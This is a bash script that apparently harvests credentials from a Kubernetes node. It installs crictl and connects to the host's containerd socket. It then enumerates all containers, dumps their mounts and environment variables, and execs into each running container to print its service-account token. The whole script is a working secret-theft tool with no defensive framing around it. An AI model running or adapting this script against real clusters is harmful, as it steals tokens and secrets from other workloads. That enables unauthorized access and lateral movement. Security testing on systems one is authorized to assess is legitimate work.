#!/bin/bash
set -euo pipefail

if [ -n "${1:-}" ]; then
  curl -L https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.30.0/crictl-v1.30.0-linux-amd64.tar.gz | tar zx -C /usr/local/bin
  cat >/etc/crictl.yaml <<'YAML'
runtime-endpoint: unix:///host/run/containerd/containerd.sock
image-endpoint: unix:///host/run/containerd/containerd.sock
timeout: 10
debug: false
YAML
fi

CRICTL="crictl ${CRICTL_FLAGS:-}"

have_jq() { command -v jq >/dev/null 2>&1; }
have_jq || { echo "[ERR] 'jq' non trovato nel PATH"; exit 1; }

TOKEN_CANDIDATES=(
  "/var/run/secrets/kubernetes.io/serviceaccount/token"
  "/var/run/secrets/kubernetes.io/serviceaccount/..data/token"
)

echo "== Enumeration container using crictl =="
CONTAINERS=$($CRICTL ps -a -q)

if [[ -z "${CONTAINERS}" ]]; then
  echo "No container found"
  exit 0
fi

for CID in $CONTAINERS; do
  JSON=$($CRICTL inspect "$CID")
  NAME=$(echo "$JSON" | jq -r '.status.metadata.name // "unknown"')
  IMAGE=$(echo "$JSON" | jq -r '.status.image.image // "unknown"')
  STATE=$(echo "$JSON" | jq -r '.status.state // "UNKNOWN"')
  POD_NAME=$(echo "$JSON" | jq -r '.status.labels["io.kubernetes.pod.name"] // "unknown"')
  POD_NS=$(echo "$JSON" | jq -r '.status.labels["io.kubernetes.pod.namespace"] // "default"')

  echo
  echo "--------------------"
  echo "Container ID:  $CID"
  echo "Name:          $NAME"
  echo "Image:         $IMAGE"
  echo "State:         $STATE"
  echo "Pod:           $POD_NAME (ns=$POD_NS)"

  echo "- Mounts:"
  if echo "$JSON" | jq -e '.info.runtimeSpec.mounts' >/dev/null 2>&1; then
    echo "$JSON" | jq -r '.info.runtimeSpec.mounts[]? | "  - \(.source) -> \(.destination) (\(.options|join(",")))"' || true
  elif echo "$JSON" | jq -e '.status.mounts' >/dev/null 2>&1; then
    echo "$JSON" | jq -r '.status.mounts[]? | "  - \(.host_path) -> \(.container_path) (ro=\(.readonly))"' || true
  else
    echo "  (no mount visible in inspect)"
  fi

  echo "- Env:"
  if echo "$JSON" | jq -e '.info.runtimeSpec.process.env' >/dev/null 2>&1; then
    echo "$JSON" | jq -r '.info.runtimeSpec.process.env[]? | "  - \(.)"' || true
  else
    echo "  (no env visible)"
  fi

  echo "- ServiceAccount tokens:"
  if [[ "$STATE" == "CONTAINER_RUNNING" ]]; then
    FOUND_ANY=0
    for path in "${TOKEN_CANDIDATES[@]}"; do
      if $CRICTL exec "$CID" sh -c "test -f '$path'" >/dev/null 2>&1; then
        TOKEN=$($CRICTL exec "$CID" sh -c "cat '$path'" || true)
        echo "  * $path"
        echo "----- BEGIN TOKEN ($path) -----"
        echo "$TOKEN"
        echo "----- END TOKEN ($path) -----"
        FOUND_ANY=1
      fi
    done

    if [[ $FOUND_ANY -eq 0 ]]; then
      echo "  (no token found)"
    fi
  else
    echo "  (container not in RUNNING)"
  fi
done

echo
echo "== Done =="
